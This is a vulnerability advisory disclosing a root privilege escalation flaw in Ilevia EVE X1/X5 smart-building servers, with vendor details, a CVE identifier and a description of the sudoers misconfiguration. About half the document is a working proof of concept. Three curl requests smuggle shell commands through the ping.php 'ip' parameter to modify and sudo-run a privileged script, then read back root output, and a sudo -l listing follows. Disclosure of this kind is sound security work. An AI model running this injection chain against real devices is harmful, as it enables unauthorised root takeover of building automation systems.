@@ -1,0 +1,87 @@
+
+Ilevia EVE X1/X5 Server 4.7.18.0.eden Root Privilege Escalation
+
+
+Vendor: Ilevia Srl.
+Product web page: https://www.ilevia.com
+Affected version: <= 4.7.18.0.eden (Logic ver: 6.00)
+
+Summary: EVE is a smart home and building automation solution designed
+for both residential and commercial environments, including malls, hotels,
+restaurants, bars, gyms, spas, boardrooms, and offices. It enables comprehensive
+control and monitoring of electrical installations through a highly customizable,
+user-friendly interface.
+
+EVE is a multi-protocol platform that integrates various systems within
+a smart building to enhance comfort, security, safety, and energy efficiency.
+Users can manage building functions via iPhone, iPad, Android devices, Windows
+PCs, or Mac computers.
+
+The EVE X1 Server is the dedicated hardware solution for advanced building
+automation needs. Compact and powerful, it is ideal for apartments, small
+to medium-sized homes, and smaller commercial installations. It is designed
+to manage entire automation systems reliably and efficiently.
+
+Desc: A misconfiguration in the sudoers file permits passwordless execution
+of specific Bash shell scripts via sudo, exposing a critical privilege escalation
+vulnerability. When such scripts are writable by a web-facing user (www-data) or
+accessible through a command injection vector, an attacker can overwrite or replace
+them with malicious payloads. Upon execution with sudo, these scripts run with
+elevated privileges, allowing the attacker to gain full root access remotely.
+
+Tested on: GNU/Linux 5.4.35 (armv7l)
+           GNU/Linux 4.19.97 (armv7l)
+           Armbian 20.02.1 Buster
+           Apache/2.4.38 (Debian)
+           PHP Version 7.3.14
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2025-5965
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2025-5965.php
+CVE ID: CVE-2025-34515
+CVE URL: https://www.cve.org/CVERecord?id=CVE-2025-34515
+
+
+01.05.2024
+
+--
+
+
+$ curl -X POST "http://ilevia:8080/ajax/php/ping.php" -d "ip=$(echo 'id' >>/home/ilevia/www-config/http/emlite/sync_project.sh)"
+$ curl -X POST "http://ilevia:8080/ajax/php/ping.php" -d "ip=$(sudo /home/ilevia/www-config/http/emlite/sync_project.sh >/tmp/test)"
+0
+$ curl -X POST "http://ilevia:8080/ajax/php/dbcheck.php" -d "db_log=/tmp/test"
+{"error":""}
+uid=0(root) gid=0(root) groups=0(root)
+
+..
+
+$ sudo -l
+Matching Defaults entries for www-data on eve:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    env_keep+=NO_AT_BRIDGE, env_keep+="http_proxy HTTP_PROXY",
+    env_keep+="https_proxy HTTPS_PROXY", env_keep+="ftp_proxy FTP_PROXY",
+    env_keep+=RSYNC_PROXY, env_keep+="no_proxy NO_PROXY"
+
+User www-data may run the following commands on eve:
+    (ALL) NOPASSWD: /etc/init.d/ilevia_services
+    (ALL) NOPASSWD: /home/ilevia/www-config/http/sh/ilevia_reboot
+    (ALL) NOPASSWD: /home/ilevia/www-config/http/sh/ilevia_general
+    (ALL) NOPASSWD: /home/ilevia/bin/ilevia_change_network
+    (ALL) NOPASSWD: /home/ilevia/bin/ilevia_change_user_password
+    (ALL) NOPASSWD: /home/ilevia/www-config/http/sh/ilevia_zonedatetime
+    (ALL) NOPASSWD: /home/ilevia/www-config/http/sh/ilevia_backup
+    (ALL) NOPASSWD: /home/ilevia/bin/ilevia_eve_stats
+    (ALL) NOPASSWD: /home/ilevia/www-config/http/sh/ilevia_eve_update_firmware
+    (ALL) NOPASSWD: /sbin/ifconfig
+    (ALL) NOPASSWD: /bin/ping
+    (ALL) NOPASSWD: /home/ilevia/bin/vivaldi/blr_vivaldi_discover
+    (ALL) NOPASSWD: /home/ilevia/bin/vivaldi/blr_vivaldi_discover.sh
+    (ALL) NOPASSWD: /home/ilevia/bin/ilevia_blackbox
+    (ALL) NOPASSWD: /home/ilevia/www-config/http/emlite/emlight_bridge
+    (ALL) NOPASSWD: /home/ilevia/www-config/http/emlite/sync_project.sh
